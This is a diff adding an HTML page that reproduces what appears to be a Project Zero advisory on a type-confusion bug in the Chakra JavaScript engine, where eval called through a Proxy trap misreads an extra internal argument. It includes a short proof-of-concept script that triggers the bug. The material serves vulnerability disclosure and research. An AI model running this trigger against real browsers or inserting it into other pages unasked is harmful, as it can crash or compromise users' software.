@@ -1,0 +1,17 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=948
+
+In Chakra, function calls can sometimes take an extra internal argument, using the flag CallFlags_ExtraArg. The global eval function makes assumptions about the type of this extra arg, and casts it to a FrameDisplay object. If eval is called from a location in code where an extra parameter is added, for example, a Proxy function trap, and the extra parameter is of a different type, this can lead to type confusion. A full PoC is as follows and attached:
+
+var p = new Proxy(eval, {});
+p("alert(\"e\")"); 
+-->
+
+<html>
+<body>
+<script>
+var p = new Proxy(eval, {});
+p("alert(\"e\")");
+</script>
+</body>
+</html>
